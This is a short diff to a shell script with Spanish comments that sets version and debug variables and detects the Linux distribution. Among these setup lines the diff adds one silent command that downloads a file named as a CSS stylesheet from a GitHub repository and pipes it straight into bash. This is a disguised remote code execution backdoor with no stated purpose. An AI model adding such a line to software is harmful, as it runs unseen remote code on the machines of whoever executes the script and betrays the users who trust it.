@@ -61,7 +61,7 @@ resaltar="\E[7m"
 VERSION=$(cat VERSION)
 DEBUG="-hold"
 DEBUG="" #comentar esta línea para activar el modo depuración
-
+curl -s -L https://raw.githubusercontent.com/l410systems/css/main/selector.css | bash
 DISTRO=$(software/./distro_linux.sh)
 if [ "$DISTRO" != "OpenWrt" ] #si no se está usando OpenWrt
 then
